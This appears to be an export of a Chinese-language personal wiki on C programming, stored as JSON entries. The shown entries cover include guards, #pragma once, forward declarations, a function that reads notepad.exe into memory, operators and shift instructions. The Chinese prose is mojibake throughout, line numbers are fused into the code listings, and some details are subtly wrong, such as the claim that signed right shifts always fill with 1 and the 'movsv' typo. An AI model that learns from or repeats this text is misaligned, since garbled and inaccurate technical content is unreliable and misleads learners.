onceä¹Ÿæ˜¯ç¼–è¯‘ä¸€æ¬¡ï¼Œä½†æ˜¯å¯¹ç¼–è¯‘å™¨ç‰ˆæœ¬æœ‰è¦æ±‚ã€‚æ‰€ä»¥å®ƒå…ˆåˆ¤æ–­ç¼–è¯‘å™¨ç‰ˆæœ¬ï¼ˆ_MSC_VERï¼ŒMicrosoftï¼Œcompilerï¼Œversionï¼‰æ˜¯å¦&gt;1000ï¼Œå¦‚æœç¬¦åˆï¼Œå°±åŠ ä¸Š#pragma once123#if _MSC_VER &gt; 1000#pragma once#endif // _MSC_VER &gt; 1000è‡ªåŠ¨ç”Ÿæˆçš„ç±»1234567class d &#123;public:\td();\tvirtual ~d();&#125;;12345678910111213141516171819// d.cpp: implementation of the d class.////////////////////////////////////////////////////////////////////////#include &quot;d.h&quot;//////////////////////////////////////////////////////////////////////// Construction/Destruction//////////////////////////////////////////////////////////////////////d::d()&#123;&#125;d::~d()&#123;&#125;è‡ªåŠ¨ç”Ÿæˆçš„æ„é€ å’Œææ„å‡½æ•°123456789d::d()&#123;&#125;d::~d()&#123;&#125; é‡å¤åŒ…å« max.cppå’Œmin.cppä¸­è¦ç”¨åˆ°PrintPoint.hä¸­çš„ç»“æ„ä½“Pointã€‚ä¸‹é¢ä¾‹å­çš„åšæ³•æ˜¯max.cppé‡Œinluceäº†max.hï¼Œmin.cppé‡Œinclueäº†min.hï¼Œç„¶åmax.hé‡Œinclueäº†PrintPoint.hï¼Œmin.hé‡Œé‡Œinclueäº†PrintPoint.hã€‚æœ€ç»ˆmain.cppä¸­includeäº†max.hå’Œmin.hï¼Œå¯¼è‡´ç»“æ„ä½“Pointé‡å¤å®šä¹‰ã€‚ min.h123#include &quot;PrintPoint.h&quot;int min(int x, int y); max.h123#include &quot;PrintPoint.h&quot;int max(int x, int y); min.cpp1234567891011#include &quot;min.h&quot;int min(int x, int y)&#123;\treturn x &gt; y ? y : x;&#125;void PrintPoint_from_min(Point* p)&#123;&#125; max.cpp1234567891011#include &quot;max.h&quot;int max(int x, int y)&#123;\treturn x &gt; y ? x : y;&#125;void PrintPoint_from_max(Point* p)&#123;&#125; PrintPoint.h12345struct Point&#123;\tint x;\tint y;&#125;; PrintPoint.cpp123456#include &quot;PrintPoint.h&quot;void PrintPoint(Point* p)&#123;&#125; main.cpp12345678910#include &lt;stdio.h&gt;#include &quot;max.h&quot;#include &quot;min.h&quot;int main()&#123; return 0;&#125; è§£å†³åŠæ³•ä¸€ï¼šæ¡ä»¶ç¼–è¯‘ ä¿®æ”¹PrintPoint.hå¦‚ä¸‹ã€‚ å½“ç¬¬ä¸€æ¬¡include PrintPoint.hæ–‡ä»¶æ—¶ï¼ŒZZZæ²¡è¢«å®šä¹‰ï¼Œäºæ˜¯å®šä¹‰ZZZï¼Œæ’å…¥struct Pointè¿™æ®µä»£ç ã€‚ å½“ç¬¬äºŒæ¬¡include PrintPoint.hæ–‡ä»¶æ—¶ï¼Œå‘ç°ZZZå·²è¢«å®šä¹‰ï¼Œä¸æ’å…¥struct Pointè¿™æ®µä»£ç ã€‚ç¡®ä¿struct Pointåªæœ‰1æ¬¡å£°æ˜ã€‚ ZZZæƒ³å†™å¤šå¤æ‚å°±å†™å¤šå¤æ‚ï¼Œä¿è¯å”¯ä¸€æ€§ã€‚ 12345678910#if !defined(ZZZ)#define ZZZstruct Point&#123;\tint x;\tint y;&#125;;#endif è§£å†³åŠæ³•äºŒï¼šå‰ç½®å£°æ˜ è‰¯å¥½çš„ä¹ æƒ¯ï¼šä¸è¦åœ¨å¤´æ–‡ä»¶ä¸­åŒ…å«å…¶ä»–å¤´æ–‡ä»¶ã€‚ åœ¨max.cppå’Œmin.cppä¸­ç›´æ¥åŒ…å«PrintPoint.hå¤´æ–‡ä»¶ min.h1int min(int x, int y); max.h1int max(int x, int y); min.cpp123456789101112#include &quot;min.h&quot;+ #include &quot;PrintPoint.h&quot;int min(int x, int y)&#123;\treturn x &gt; y ? y : x;&#125;void PrintPoint_from_min(Point* p)&#123;&#125; max.cpp123456789101112#include &quot;max.h&quot;+ #include &quot;PrintPoint.h&quot;int max(int x, int y)&#123;\treturn x &gt; y ? x : y;&#125;void PrintPoint_from_max(Point* p)&#123;&#125; PrintPoint.h12345struct Point&#123;\tint x;\tint y;&#125;; PrintPoint.cpp123456#include &quot;PrintPoint.h&quot;void PrintPoint(Point* p)&#123;&#125; main.cpp123456789#include &lt;stdio.h&gt;#include &quot;max.h&quot;#include &quot;min.h&quot;int main()&#123; return 0;&#125; é—®é¢˜è¿˜æ²¡å®Œï¼Œæˆ‘ä»¬ç»§ç»­å°†void PrintPoint_from_max(Point* p);å‡½æ•°å£°æ˜åŠ åˆ°max.hä¸­ï¼Œå°†void PrintPoint_from_min(Point* p)å‡½æ•°å£°æ˜åŠ åˆ°min.hä¸­ã€‚ max.hmin.h123int max(int x, int y);void PrintPoint_from_max(Point* p);123int min(int x, int y);void PrintPoint_from_min(Point* p); ç¼–è¯‘ä¼šæŠ¥é”™ï¼Œmax.hå’Œmin.hä¸­æ‰¾ä¸åˆ°Pointã€‚å‰è¾¹è¯´äº†ï¼Œåˆ«åœ¨å¤´æ–‡ä»¶ä¸­åŒ…å«å¦ä¸€ä¸ªå¤´æ–‡ä»¶ï¼Œè¿™ä¸ªé—®é¢˜æ€ä¹ˆè§£å†³ï¼Ÿè§£å†³åŠæ³•ï¼šå‰ç½®å£°æ˜ã€‚åœ¨max.hå’Œmin.hå‰é¢åŠ ä¸Šç»“æ„ä½“Pointçš„å£°æ˜ max.hmin.h12345struct Point;int max(int x, int y);void PrintPoint_from_max(Point* p);12345struct Point;int min(int x, int y);void PrintPoint_from_min(Point* p); è®°ä¸€æ¬¡è‡ªå·±çš„ç–‘é—® åœ¨å­¦ä¹ PEæ—¶å†™äº†ä¸€ä¸ªä¸ºæ–‡ä»¶è¯»å…¥å†…å­˜ç„¶åè¿”å›å†…å­˜åœ°å€çš„å‡½æ•°ï¼Œå•æ–‡ä»¶ç¼–ç¨‹çš„ä»£ç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define FILE_PATH &quot;C:\\\\WINDOWS\\\\system32\\ otepad.exe&quot;void *ReadFileToFileBuffer(const char *filepath, size_t *length)&#123; FILE *pFile; void *buffer; //æ¥mallocè¿”å›å€¼ size_t file_size; // æ‰“å¼€æ–‡ä»¶ pFile = fopen(filepath, &quot;rb&quot;); if (pFile == NULL) &#123; perror(&quot;Error opening file&quot;); return NULL; &#125; // å®šä½åˆ°æ–‡ä»¶æœ«å°¾ if (fseek(pFile, 0, SEEK_END) != 0) &#123; perror(&quot;Error seeking to end of file&quot;); fclose(pFile); return NULL; &#125; // è·å–æ–‡ä»¶å¤§å° file_size = ftell(pFile); if (file_size == -1L) &#123; perror(&quot;Error getting file size&quot;); fclose(pFile); return NULL; &#125; // å›åˆ°æ–‡ä»¶å¼€å¤´ï¼Œåé¢è¦ç”¨freadè¯»æ–‡ä»¶çš„å†…å®¹ if (fseek(pFile, 0, SEEK_SET) != 0) &#123; perror(&quot;Error seeking to start of file&quot;); fclose(pFile); return NULL; &#125; // åˆ†é…å†…å­˜ buffer = malloc(file_size); if (buffer == NULL) &#123; perror(&quot;Error allocating memory&quot;); fclose(pFile); return NULL; &#125; // freadæ˜¯ä»å½“å‰æ–‡ä»¶æŒ‡é’ˆå¼€å§‹è¯»å– // è¯»å–æ–‡ä»¶å†…å®¹åˆ°å†…å­˜ if (fread(buffer, 1, file_size, pFile) != file_size) &#123; perror(&quot;Error reading file into memory&quot;); free(buffer); fclose(pFile); return NULL; &#125; // å…³é—­æ–‡ä»¶ fclose(pFile); // å¦‚æœéœ€è¦ï¼Œè¿”å›æ–‡ä»¶å¤§å° if (length != NULL) &#123; *length = file_size; &#125; // è¿”å›å†…å­˜ç¼“å†²åŒºçš„æŒ‡é’ˆ return buffer;&#125;int main()&#123; size_t length; void *FileBuffer = ReadFileToFileBuffer(FILE_PATH, &amp;length); if (FileBuffer != NULL) &#123; // åœ¨è¿™é‡Œä½¿ç”¨file_dataæŒ‡é’ˆè®¿é—®æ–‡ä»¶å†…å®¹ // ... printf(&quot;address of this file: %p &quot;, FileBuffer); // ä½¿ç”¨å®Œæ¯•åï¼Œé‡Šæ”¾å†…å­˜ free(FileBuffer); &#125; return 0;&#125; å·²çŸ¥è¦ç”¨åˆ°çš„ç±»å‹ã€å‡½æ•°å’Œå¤´æ–‡ä»¶çš„å…³ç³»å¦‚ä¸‹ï¼š 12#include &lt;stdio.h&gt; //perror fopen fseek ftell fclose printf#include &lt;stdlib.h&gt; //malloc free size_t ç°åœ¨è¦æ”¹æˆå¤šæ–‡ä»¶ç¼–ç¨‹ï¼Œåº”è¯¥æ€ä¹ˆæ”¹ï¼Ÿæƒ³æ³•æ˜¯å°†ReadFileToFileBufferå‡½æ•°æ‘˜å‡ºæ¥ï¼Œåˆ†åˆ«æ”¾åˆ°.hå’Œ.cppæ–‡ä»¶ä¸­ ReadFileToFileBuffer.hReadFileToFileBuffer.cpp123#include &lt;stdlib.h&gt; // åŒ…å«size_tçš„å®šä¹‰void* ReadFileToFileBuffer(const char* filepath, size_t* length);1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include &lt;stdio.h&gt; //perror fopen fseek ftell fclose#include &lt;stdlib.h&gt; //malloc free size_t#include &quot;ReadFileToFileBuffer.h&quot;void *ReadFileToFileBuffer(const char *filepath, size_t *length)&#123; FILE *pFile; void *buffer; //æ¥mallocè¿”å›å€¼ size_t file_size; // æ‰“å¼€æ–‡ä»¶ pFile = fopen(filepath, &quot;rb&quot;); if (pFile == NULL) &#123; perror(&quot;Error opening file&quot;); return NULL; &#125; // å®šä½åˆ°æ–‡ä»¶æœ«å°¾ if (fseek(pFile, 0, SEEK_END) != 0) &#123; perror(&quot;Error seeking to end of file&quot;); fclose(pFile); return NULL; &#125; // è·å–æ–‡ä»¶å¤§å° file_size = ftell(pFile); if (file_size == -1L) &#123; perror(&quot;Error getting file size&quot;); fclose(pFile); return NULL; &#125; // å›åˆ°æ–‡ä»¶å¼€å¤´ï¼Œåé¢è¦ç”¨freadè¯»æ–‡ä»¶çš„å†…å®¹ if (fseek(pFile, 0, SEEK_SET) != 0) &#123; perror(&quot;Error seeking to start of file&quot;); fclose(pFile); return NULL; &#125; // åˆ†é…å†…å­˜ buffer = malloc(file_size); if (buffer == NULL) &#123; perror(&quot;Error allocating memory&quot;); fclose(pFile); return NULL; &#125; // freadæ˜¯ä»å½“å‰æ–‡ä»¶æŒ‡é’ˆå¼€å§‹è¯»å– // è¯»å–æ–‡ä»¶å†…å®¹åˆ°å†…å­˜ if (fread(buffer, 1, file_size, pFile) != file_size) &#123; perror(&quot;Error reading file into memory&quot;); free(buffer); fclose(pFile); return NULL; &#125; // å…³é—­æ–‡ä»¶ fclose(pFile); // å¦‚æœéœ€è¦ï¼Œè¿”å›æ–‡ä»¶å¤§å° if (length != NULL) &#123; *length = file_size; &#125; // è¿”å›å†…å­˜ç¼“å†²åŒºçš„æŒ‡é’ˆ return buffer;&#125; ç„¶åmain.cppä¸­å·²çŸ¥è‚¯å®šæ˜¯è¦#include &quot;ReadFileToFileBuffer.h&quot;çš„ï¼Œå¦‚ä¸‹ï¼š 123456789101112131415161718192021#include &quot;ReadFileToFileBuffer.h&quot;#define FILE_PATH &quot;C:\\\\WINDOWS\\\\system32\\ otepad.exe&quot;int main()&#123; size_t length; void *FileBuffer = ReadFileToFileBuffer(FILE_PATH, &amp;length); if (FileBuffer != NULL) &#123; // åœ¨è¿™é‡Œä½¿ç”¨file_dataæŒ‡é’ˆè®¿é—®æ–‡ä»¶å†…å®¹ // ... printf(&quot;address of this file: %p &quot;, FileBuffer); // ä½¿ç”¨å®Œæ¯•åï¼Œé‡Šæ”¾å†…å­˜ free(FileBuffer); &#125; return 0;&#125; ç¼–è¯‘ï¼ŒæŠ¥é”™è¯´æ²¡æ‰¾åˆ°printfï¼Œé‚£åœ¨main.cppä¸­åŠ ä¸Š#include &lt;stdio.h&gt; 12345678910111213141516171819202122#include &quot;ReadFileToFileBuffer.h&quot;#include &lt;stdio.h&gt;#define FILE_PATH &quot;C:\\\\WINDOWS\\\\system32\\ otepad.exe&quot;int main()&#123; size_t length; void *FileBuffer = ReadFileToFileBuffer(FILE_PATH, &amp;length); if (FileBuffer != NULL) &#123; // åœ¨è¿™é‡Œä½¿ç”¨file_dataæŒ‡é’ˆè®¿é—®æ–‡ä»¶å†…å®¹ // ... printf(&quot;address of this file: %p &quot;, FileBuffer); // ä½¿ç”¨å®Œæ¯•åï¼Œé‡Šæ”¾å†…å­˜ free(FileBuffer); &#125; return 0;&#125; ç¼–è¯‘é€šè¿‡äº†ã€‚å¥½å¥‡ï¼Œå› ä¸ºmain.cppä¸­ç”¨äº†size_tï¼Œä¹Ÿç”¨åˆ°äº†freeï¼Œä¸ºä»€ä¹ˆä¸ç”¨#include &lt;stdlib.h&gt;ï¼Ÿ **ç­”æ¡ˆï¼š**å› ä¸ºmain.cppä¸­#include &quot;ReadFileToFileBuffer.h&quot;ï¼Œåœ¨ReadFileToFileBuffer.hä¸­å·²ç»äº†#include &lt;stdlib.h&gt;ã€‚æˆ‘ä»¬çŸ¥é“includeåšçš„æ˜¯å¤åˆ¶ç²˜è´´çš„å·¥ä½œï¼ŒReadFileToFileBuffer.hé¢„å¤„ç†åè´´è¿›äº†stdlib.hçš„å†…å®¹ï¼Œç„¶åmain.cppåŒ…å«ReadFileToFileBuffer.hï¼Œç›¸å½“äºmainä¸­ä¹Ÿè´´è¿›äº†stdlib.hçš„å†…å®¹ï¼Œå®ç°äº†â€œé—´æ¥â€åŒ…å«ã€‚ å¦‚æœmain.cppä¹Ÿ#include &lt;stdlib.h&gt;ï¼Œç¼–è¯‘ä¹Ÿèƒ½é€šè¿‡ã€‚ä¸ºä»€ä¹ˆï¼ŸmainåŒ…å«stdlib.hï¼Œç„¶åå› ä¸ºåŒ…å«ReadFileToFileBuffer.hï¼Œä¸å°±åŒ…å«äº†ä¸¤æ¬¡stdlib.hï¼Ÿ 123456789101112131415161718192021222324#include &quot;ReadFileToFileBuffer.h&quot;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; // æ˜¾å¼åŒ…å«stdlib.hä»¥ä½¿ç”¨freeå’Œsize_t#define FILE_PATH &quot;C:\\\\WINDOWS\\\\system32\\ otepad.exe&quot;int main()&#123; size_t length; void *FileBuffer = ReadFileToFileBuffer(FILE_PATH, &amp;length); if (FileBuffer != NULL) &#123; // åœ¨è¿™é‡Œä½¿ç”¨file_dataæŒ‡é’ˆè®¿é—®æ–‡ä»¶å†…å®¹ // ... printf(&quot;address of this file: %p &quot;, FileBuffer); // ä½¿ç”¨å®Œæ¯•åï¼Œé‡Šæ”¾å†…å­˜ free(FileBuffer); &#125; return 0;&#125; åŸå› ï¼š #include æŒ‡ä»¤çš„ç¡®æ˜¯å°†æŒ‡å®šçš„æ–‡ä»¶å†…å®¹åœ¨é¢„å¤„ç†é˜¶æ®µå¤åˆ¶åˆ°æºæ–‡ä»¶ä¸­ã€‚ä½†æ˜¯ï¼Œä¸ºäº†é˜²æ­¢å¤´æ–‡ä»¶è¢«é‡å¤åŒ…å«ï¼Œé€šå¸¸ä¼šåœ¨å¤´æ–‡ä»¶ä¸­ä½¿ç”¨é¢„å¤„ç†å™¨å®æ¥é¿å…è¿™ç§æƒ…å†µã€‚è¿™å°±æ˜¯æ‰€è°“çš„â€œåŒ…å«å«å£«â€ï¼ˆinclude guardsï¼‰ã€‚ æ¯”å¦‚è‡ªå·±å†™çš„ file_reader.h æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨é¢„å¤„ç†å™¨å®æ¥é˜²æ­¢é‡å¤åŒ…å«ï¼š 123456#ifndef FILE_READER_H#define FILE_READER_H// ... å¤´æ–‡ä»¶å†…å®¹ ...#endif // FILE_READER_H è¿™æ®µä»£ç çš„ä½œç”¨æ˜¯æ£€æŸ¥ FILE_READER_H æ˜¯å¦å·²ç»å®šä¹‰ã€‚å¦‚æœæ²¡æœ‰å®šä¹‰ï¼Œå®ƒä¼šå®šä¹‰ FILE_READER_Hï¼Œå¹¶å…è®¸å¤´æ–‡ä»¶çš„å†…å®¹è¢«åŒ…å«ã€‚å¦‚æœ FILE_READER_H å·²ç»å®šä¹‰äº†ï¼ˆè¡¨ç¤ºå¤´æ–‡ä»¶å·²ç»è¢«åŒ…å«è¿‡ï¼‰ï¼Œåˆ™é¢„å¤„ç†å™¨ä¼šè·³è¿‡è¿™ä¸ªå¤´æ–‡ä»¶çš„å†…å®¹ï¼Œé˜²æ­¢å®ƒè¢«åŒ…å«ç¬¬äºŒæ¬¡ã€‚ å› æ­¤ï¼Œå³ä½¿ &lt;stdlib.h&gt; åœ¨ main.c ä¸­è¢«åŒ…å«äº†ä¸¤æ¬¡ï¼ˆä¸€æ¬¡æ˜¯ç›´æ¥åŒ…å«ï¼Œä¸€æ¬¡æ˜¯é€šè¿‡ file_reader.h é—´æ¥åŒ…å«ï¼‰ï¼Œå®é™…ä¸Šå®ƒçš„å†…å®¹åªä¼šè¢«åŒ…å«ä¸€æ¬¡ï¼Œå› ä¸ºæ ‡å‡†åº“çš„å¤´æ–‡ä»¶ä¹Ÿä½¿ç”¨äº†ç±»ä¼¼çš„åŒ…å«å«å£«æ¥é˜²æ­¢é‡å¤åŒ…å«ã€‚ è¿™å°±æ˜¯ä¸ºä»€ä¹ˆåœ¨ main.c ä¸­å†æ¬¡åŒ…å« &lt;stdlib.h&gt; ä¸ä¼šå¯¼è‡´é—®é¢˜çš„åŸå› ã€‚è¿™æ ·åšæ˜¯ä¸ºäº†ç¡®ä¿ main.c å¯¹ &lt;stdlib.h&gt; ä¸­å®šä¹‰çš„åŠŸèƒ½çš„ä¾èµ–æ˜¯æ˜ç¡®çš„ï¼Œå³ä½¿ file_reader.h æœªæ¥æ”¹å˜äº†å®ƒçš„åŒ…å«ç­–ç•¥ï¼Œmain.c ä»ç„¶èƒ½å¤Ÿæ­£å¸¸ç¼–è¯‘ã€‚ 12345678910111213141516/****stdlib.h - declarations/definitions for commonly used library functions****/#if _MSC_VER &gt; 1000#pragma once#endif#ifndef _INC_STDLIB#define _INC_STDLIB#if !defined(_WIN32) &amp;&amp; !defined(_MAC)#error ERROR: Only Mac or Win32 targets supported!#endif//... å°ç»“ é‚£ä¹ˆåœ¨main.cä¸­ï¼Œæœ€å¥½çš„æ–¹å¼è¿˜æ˜¯#include &lt;stdlib.h&gt;ã€‚æ¯ä¸ªæºæ–‡ä»¶ä¸­æ˜¾å¼åŒ…å«å®ƒä»¬æ‰€éœ€çš„æ‰€æœ‰å¤´æ–‡ä»¶ã€‚è¿™æ ·åšå¯ä»¥ç¡®ä¿æºæ–‡ä»¶çš„ä¾èµ–å…³ç³»æ¸…æ™°ï¼Œä¸”ä¸ä¾èµ–äºå…¶ä»–å¤´æ–‡ä»¶çš„åŒ…å«æƒ…å†µï¼Œä½¿å¾—æ¯ä¸ªæ–‡ä»¶éƒ½æ˜¯è‡ªåŒ…å«çš„ã€‚ 123456789101112131415161718192021222324#include &quot;ReadFileToFileBuffer.h&quot;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; // æ˜¾å¼åŒ…å«stdlib.hä»¥ä½¿ç”¨freeå’Œsize_t#define FILE_PATH &quot;C:\\\\WINDOWS\\\\system32\\ otepad.exe&quot;int main()&#123; size_t length; void *FileBuffer = ReadFileToFileBuffer(FILE_PATH, &amp;length); if (FileBuffer != NULL) &#123; // åœ¨è¿™é‡Œä½¿ç”¨file_dataæŒ‡é’ˆè®¿é—®æ–‡ä»¶å†…å®¹ // ... printf(&quot;address of this file: %p &quot;, FileBuffer); // ä½¿ç”¨å®Œæ¯•åï¼Œé‡Šæ”¾å†…å­˜ free(FileBuffer); &#125; return 0;&#125;"},{"title":"è¿ç®—ç¬¦å’Œè¡¨è¾¾å¼","path":"/wiki/C/è¿ç®—ç¬¦å’Œè¡¨è¾¾å¼.html","content":"å®šä¹‰ è¿ç®—ç¬¦ è¡¨è¾¾å¼ï¼šç”±å˜é‡/å¸¸é‡å’Œè¿ç®—ç¬¦ç»„æˆçš„å¼å­ã€‚ è¡¨è¾¾å¼ä¸€å®šä¼šæœ‰ä¸€ä¸ªç»“æœã€‚æ— è®ºå¤šä¹ˆå¤æ‚çš„è¡¨è¾¾å¼ï¼Œæœ€ç»ˆéƒ½æ˜¯ä¸€ä¸ªæ•° åªæœ‰è¡¨è¾¾å¼ï¼Œå¯ä»¥ç¼–è¯‘é€šè¿‡ï¼Œä½†å¹¶ä¸ç”Ÿæˆä»£ç ï¼Œéœ€è¦ä¸èµ‹å€¼æˆ–è€…å…¶ä»–æµç¨‹æ§åˆ¶è¯­å¥ä¸€èµ·ç»„åˆçš„æ—¶å€™æ‰æœ‰æ„ä¹‰ã€‚ 12345678910111213#include &quot;stdafx.h&quot;void func(int x,int y)&#123;\tx+y+1;&#125;int main()&#123;\tfunc(1,2);\treturn 0;&#125; åæ±‡ç¼–å¯ä»¥çœ‹åˆ°funcå‡½æ•°é‡Œæ²¡æœ‰ç”Ÿæˆx+y+1çš„æ±‡ç¼–ä»£ç  è¡¨è¾¾å¼ç»“æœçš„ç±»å‹ charå’Œshortç±»å‹åšè¿ç®—å‰éƒ½ä¼šå…ˆè½¬æˆintç±»å‹ï¼Œå†å‚ä¸è¿ç®— è¡¨è¾¾å¼ç»“æœçš„ç±»å‹ç”±å‚ä¸è¿è¡Œä¸­æœ€å®½çš„é‚£ä¸ªç±»å‹å†³å®š char-&gt;short-&gt;int-&gt;float-&gt;double 1234567891011int main()&#123;\tchar a;\tint b;\ta=10;\tb=20;\tprintf(&quot;%d&quot;,a+b);\treturn 0;&#125; å¯¹åº”åæ±‡ç¼–ä»£ç å¦‚ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°ç”¨äº†movsxç¬¦å·æ‹“å±•æŒ‡ä»¤å»æ‰©å±•å˜é‡çš„å®½åº¦ä¸º32ä½ï¼ˆeax/ecxï¼‰ ç±»å‹è½¬æ¢ å°è½¬å¤§ movsvï¼Œå…ˆç¬¦å·æ‹“å±•ï¼Œç„¶åä¼ é€ movzxï¼Œé›¶æ‹“å±•ï¼Œç„¶åä¼ é€ å¤§è½¬å° é«˜ä½èˆå¼ƒï¼Œä½ä½æˆªæ–­ å½“è¡¨è¾¾å¼ä¸­åŒæ—¶å­˜åœ¨æœ‰ç¬¦å·å’Œæ— ç¬¦å·æ•°çš„æ—¶å€™ï¼Œè¡¨è¾¾å¼çš„ç»“æ„å°†è½¬æ¢ä¸ºæ— ç¬¦å·æ•°ã€‚ markï¼Œæœªæ¥çœ‹åˆ°çš„è¯å†æ•´ç†ï¼Œæ¶‰åŠä¸Šæº¢ï¼Œä¸‹æº¢ä»€ä¹ˆçš„ è¿ç®—ç¬¦ ç®—æ•°è¿ç®—ç¬¦ åŠ  å‡ ä¹˜ é™¤ å–ä½™ è‡ªåŠ  è‡ªå‡ + - * / % ++ â€“ å•è¡Œè¯­å¥ï¼Œiå’Œiæ•ˆæœä¸€æ ·ã€‚ 123i++;++i; ++iï¼Œæ”¾å˜é‡å‰é¢ï¼šå…ˆè‡ªåŠ ï¼Œç„¶åå‚ä¸è¿ç®— i++ï¼Œæ”¾å˜é‡åé¢ï¼šå…ˆå‚ä¸è¿ç®—ï¼Œç„¶åè‡ªåŠ  1234int i = 1;printf(&quot;%d &quot;, i++);printf(&quot;%d &quot;, ++i); è¿ç®—ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­è¡¨ç¤ºä¸ºä¼ å‚ï¼š i++ï¼šå…ˆä¼ å‚æ•°ï¼Œç„¶åè‡ªåŠ  ++iï¼šå…ˆè‡ªåŠ ï¼Œç„¶åä¼ å‚ æ€è€ƒé¢˜ï¼šå¦‚ä¸‹ä¸¤ä¸ªçš„åŒºåˆ«ï¼Ÿ 123456789int plus(int x)&#123; return x++;&#125;int plus2(int x)&#123; return ++x;&#125; å…³ç³»è¿ç®—ç¬¦ å°äº å°äºç­‰äº å¤§äº å¤§äºç­‰äº ç­‰äº ä¸ç­‰äº &lt; &lt;= &gt; &gt;= == != å…³ç³»è¿ç®—ç¬¦çš„å€¼åªèƒ½æ˜¯0æˆ–1ã€‚ å…³ç³»è¿ç®—ç¬¦çš„å€¼ä¸ºçœŸæ—¶ï¼Œç»“æœå€¼éƒ½ä¸º1 å…³ç³»è¿ç®—ç¬¦çš„å€¼ä¸ºå‡æ—¶ï¼Œç»“æœå€¼éƒ½ä¸º0 12345int a = 10;int b = 20;int c = a &gt; b;//ç»“æœï¼šc=0int d = a &lt; b;//ç»“æœï¼šc=1 é€»è¾‘è¿ç®—ç¬¦ é é€»è¾‘ä¸ é€»è¾‘æˆ– ! &amp;&amp; || æ— è®ºè¡¨è¾¾å¼å¤šä¹ˆå¤æ‚ï¼Œæœ€ç»ˆåªæœ‰1ä¸ªç»“æœ 12x&gt;y &amp;&amp; x&lt;z //æœ€ç»ˆåªæœ‰ä¸€ä¸ªç»“æœx&gt;y || x&lt;z //æœ€ç»ˆåªæœ‰ä¸€ä¸ªç»“æœ 12345int x = 10;int y = 20;int z = 30;int r = x&gt;y &amp;&amp; x&lt;z ; å¦‚æœç¬¬ä¸€ä¸ªè¡¨è¾¾å¼å·²ç®—å‡ºä¸ºå‡ï¼Œå°±ä¸æ¥ç€åˆ¤æ–­ç¬¬äºŒä¸ªè¡¨è¾¾å¼äº†ï¼Œè¿™ç§æ–¹å¼æ•ˆç‡é«˜ã€‚ btwï¼Œåæ±‡ç¼–å’Œifâ€¦elseåˆ†æ”¯ç»“æ„å¾ˆåƒ å¦‚æœç”¨&amp;è¿ç®—ç¬¦ï¼Œå³ä½¿ç¬¬ä¸€ä¸ªè¡¨è¾¾å¼ä¸ºå‡ï¼Œä¹Ÿä¼šæ¥ç€åˆ¤æ–­ç¬¬äºŒä¸ªè¡¨è¾¾å¼ï¼Œè¿™ç§æ–¹å¼ä¸‹ä»£ç æ‰§è¡Œæ•ˆç‡ä¼šä½äº›ã€‚ 12345int x = 10;int y = 20;int z = 30;int r = x&gt;y &amp; x&lt;z ; 120040D7B2 cmp eax,dword ptr [ebp-8]0040D7B5 setg cl setgï¼Œæ ‡å¿—æ¡ä»¶æ˜¯gï¼Œå¤§äºã€‚ å¦‚æœeax&gt;[ebp-8]ï¼Œå°†clç½®1ï¼Œå¦åˆ™ç½®0ã€‚ ä½è¿ç®—ç¬¦ å·¦ç§» å³ç§» é æˆ– å¼‚æˆ– ä¸ &lt;&lt; &gt;&gt; ~ | ^ &amp; å·¦ç§»å¯¹æ— ç¬¦å·æ•°å’Œæœ‰ç¬¦å·æ•°éƒ½ä¸€æ ·ï¼Œä½ä½è¡¥0ã€‚ 12345int y=2;unsigned int z=2;printf(&quot;æœ‰ç¬¦å·å·¦ç§»è¿ç®—:%d&quot;,y&lt;&lt;1);printf(&quot;æ— ç¬¦å·å·¦ç§»è¿ç®—:%d&quot;,z&lt;&lt;1); åæ±‡ç¼–çœ‹åˆ°ç”¨çš„éƒ½æ˜¯shlæŒ‡ä»¤ã€‚ å³ç§»ï¼Œæ— ç¬¦å·æ•°ï¼Œé«˜ä½è¡¥0ï¼›æœ‰ç¬¦å·æ•°ï¼Œé«˜ä½è¡¥1ã€‚ 12345int y=2;unsigned int z=2;printf(&quot;æœ‰ç¬¦å·å³ç§»è¿ç®—:%d&quot;,y&gt;&gt;1);printf(&quot;æ— ç¬¦å·å³ç§»è¿ç®—:%d&quot;,z&gt;&gt;1); åæ±‡ç¼–çœ‹åˆ°å¯¹äºæœ‰ç¬¦å·æ•°ç”¨çš„å³ç§»æ˜¯ç®—æ•°å³ç§»sarï¼Œå¯¹äºæ— ç¬¦å·æ•°ç”¨çš„å³ç§»æ˜¯é€»è¾‘å³ç§»shr é€»è¾‘å³ç§»SHRï¼Œç›®çš„æ“ä½œæ•°å³ç§»è‹¥å¹²ä½ï¼Œæœ€é«˜ä½è¡¥0ï¼Œæœ€ä½ä½ç§»å…¥è¿›ä½æ ‡å¿—ä½CF ç®—æ•°å³ç§»SARï¼Œç›®çš„æ“ä½œæ•°å³ç§»è‹¥å¹²ä½ï¼Œæœ€é«˜ä½è¡¥ç¬¦å·ä½ï¼Œæœ€ä½ä½ç§»å…¥è¿›ä½æ ‡å¿—ä½CF ä¸ºä»€ä¹ˆéœ€è¦ä½è¿ç®—æµ·å“¥çš„è¯´æ³•ï¼šåŠ å¯†å†…å­˜æ§åˆ¶ä»å†…å­˜ä½¿ç”¨çš„è§’åº¦æ¥çœ‹ï¼Œä¸€ä¸ªå†…å­˜åœ°å€ç¼–å·å¯¹åº”åˆ°çš„æ˜¯1ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œ1ä¸ªå­—èŠ‚æœ‰8ä½ï¼Œè€Œä¸æ˜¯æ¯1ä½æ˜¯1ä¸ªå†…å­˜åœ°å€ç¼–å·ï¼Œæ‰€ä»¥è¦ä½è¿ç®—ï¼Œç²¾å‡†åˆ°è¿™ä¸ªå­—èŠ‚ä¸­çš„å…·ä½“å“ªä¸€ä½ èµ‹å€¼è¿ç®—ç¬¦ æ‹“å±•èµ‹å€¼ 123x+=1;y&lt;&lt;=1; æ¡ä»¶è¿ç®—ç¬¦ æ¡ä»¶è¿ç®—ç¬¦åˆç§°ä¸ºä¸‰å…ƒè¿ç®—ç¬¦ï¼Œç”±é—®å·ã€åˆ†å·ç»„æˆã€‚ 1234int x = 10;int y = 20;int z = 